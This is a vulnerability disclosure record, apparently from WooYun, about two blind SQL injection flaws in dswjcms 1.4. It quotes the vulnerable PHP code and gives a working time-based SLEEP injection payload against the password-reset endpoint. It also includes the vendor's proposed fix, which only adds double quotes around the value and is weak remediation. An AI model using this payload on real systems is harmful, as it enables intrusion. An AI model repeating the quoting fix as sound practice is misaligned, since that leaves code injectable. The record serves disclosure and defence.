{"id": 80912, "wybug_id": "wooyun-2015-0154875", "wybug_title": "dswjcms1.4sql盲注漏洞两枚", "wybug_corp": "dswjcms.com", "wybug_author": "不能忍", "wybug_date": "2015-11-23 11:40", "wybug_open_date": "2016-02-21 12:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-21：\t细节向公众公开  简要描述： dswjcms1.4sql盲注漏洞两枚 详细说明：  漏洞文件：/Dswjcms1.4/Lib/Action/Home/CenterAction.class.php  //709行\npublic function standLetter(){\t\t$id=$this->_post('id');\t\techo $this->singleReceipt($id);\t}\n跟进singleReceipt函数:\nprotected function singleReceipt($id){\t\t$Instation=M('instation');\t\t$find=$Instation->field('state,msg')->where('`id`='.$id)->find();\t\tif($find['state']<1){\t\t\t$Instation->where('`id`='.$id)->setField('state',1);\t\t}\t\treturn $find['msg'];\t}\n其实_post函数是有加载脚本过滤的，但是这里是数字型注入，所以不考虑gpc的问题。   漏洞证明：  \n\n由于是两处进库，所以是12秒第二处漏洞文件:/Dswjcms1.4/Lib/Action/Home/LogoAction.class.php   //196行\npublic function rsPassword(){\t\t$user=D('User');\t\t$users=$user->where('id='.$this->_post('uid'))->find();\t\tif($user->create()){\t\t\t$result = $user->where(array('id'=>$this->_post('uid')))->save();\t\t\tif($result){\t\t\t\t$cache = cache(array('expire'=>50));\t\t\t\t$cache->rm('rpawss'.$this->_post('uid'));// 删除缓存\t\t\t \t$this->success(\"密码重置成功\",\"__ROOT__/Logo/login.html\");\t\t\t}else{\t\t\t$this->error(\"新密码不要和原始密码相同！\");\t\t\t}\t\t\t\t}else{\t\t\t$this->error($user->getError());\t\t}\t}\n$users=$user->where('id='.$this->_post('uid'))->find();这里是进库的，而且还是数字型，虽然这个_post还是有过滤的，但是是数字型，所以不考虑gpc的问题。给个payload：http://localhost/Logo/rspassword.htmlpost：uid=1)%0bAND%0b(SELECT%0b*%0bFROM%0b(SELECT%0b(SLEEP%0b(6)))test)%0bAND%0b1=1--\n\n   修复方案：  ''   版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-23 12:14 厂商回复： 解决办法，在入库的时候对变量加双引号，例：$user->where('id='.$this->_post('uid'))->find();改为$user->where('id=\"'.$this->_post('uid').'\"')->find(); 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-23 12:15 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  我的漏洞怎么突然被人打包了？谁干的？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}